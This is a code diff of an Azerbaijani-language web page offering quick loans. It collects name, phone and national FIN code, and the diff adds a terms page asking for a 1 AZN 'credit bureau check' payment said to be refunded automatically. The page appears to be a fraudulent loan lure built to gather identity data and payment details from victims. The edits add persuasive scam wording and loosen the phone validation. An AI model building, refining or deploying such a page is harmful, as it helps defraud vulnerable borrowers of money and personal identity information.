@@ -128,7 +128,7 @@ display:none;padding:20px;z-index:9999;
 
 <div class="apply-box">
 <input id="name" placeholder="Ad soyad">
-<input id="phone" placeholder="055-555-55-55">
+<input id="phone" placeholder="Telefon nömrəsi">
 <input id="fin" placeholder="FIN kod">
 <button onclick="submitForm()">Kredit al</button>
 </div>
@@ -143,9 +143,20 @@ display:none;padding:20px;z-index:9999;
 <!-- TERMS -->
 <div id="termsPage">
 <button onclick="closeTerms()">←</button>
-<h2>Şərtlər</h2>
-<p>Kredit tarixçəniz yoxlanacaq</p>
-<button>1 AZN ödə</button>
+
+<h2>Hörmətli Müştəri!</h2>
+
+<p style="margin-top:15px;font-size:18px;line-height:1.5;">
+Kredit tarixçənizin yoxlanılması üçün<br>
+Azərbaycan Kredit Bürosuna sorğu<br>
+göndərmək məqsədi ilə <b>1 AZN</b> ödəniş tələb olunur.<br><br>
+Sonra 1 AZN pulunuz avtomatik geri qayıdacaq balansınıza.
+</p>
+
+<button style="margin-top:30px;padding:12px;width:100%;background:#00b894;color:white;border:none;border-radius:10px;">
+1 AZN ödə
+</button>
+
 </div>
 
 <script>
@@ -173,21 +184,21 @@ let amount=Number(range.value);
 let days=Number(timeSelect.value);
 let total=Math.round(amount+(amount*(0.2+(days/365)*0.3)));
 
-amountEl.innerText=amount+" ₼";
-returnEl.innerText=total+" ₼";
-timeText.innerText=timeSelect.options[timeSelect.selectedIndex].text;
+document.getElementById("amount").innerText=amount+" ₼";
+document.getElementById("return").innerText=total+" ₼";
+document.getElementById("timeText").innerText=timeSelect.options[timeSelect.selectedIndex].text;
 
-d15.innerText=Math.round(total*0.85)+" ₼";
-d20.innerText=Math.round(total*0.9)+" ₼";
-d25.innerText=Math.round(total*0.95)+" ₼";
-d30.innerText=total+" ₼";
+document.getElementById("d15").innerText=Math.round(total*0.85)+" ₼";
+document.getElementById("d20").innerText=Math.round(total*0.9)+" ₼";
+document.getElementById("d25").innerText=Math.round(total*0.95)+" ₼";
+document.getElementById("d30").innerText=total+" ₼";
 }
 
 range.oninput=calc;
 timeSelect.onchange=calc;
 calc();
 
-/* VALIDATION + OPEN TERMS */
+/* VALIDATION */
 function submitForm(){
 let name=document.getElementById("name").value.trim();
 let phone=document.getElementById("phone").value.trim();
@@ -198,8 +209,8 @@ alert("Ad soyad düzgün yazılmayıb");
 return;
 }
 
-if(!/^0\d{2}-\d{3}-\d{2}-\d{2}$/.test(phone)){
-alert("Telefon nömrəsi səhvdir");
+if(phone.length<9){
+alert("Telefon nömrəsini düzgün daxil edin");
 return;
 }
 
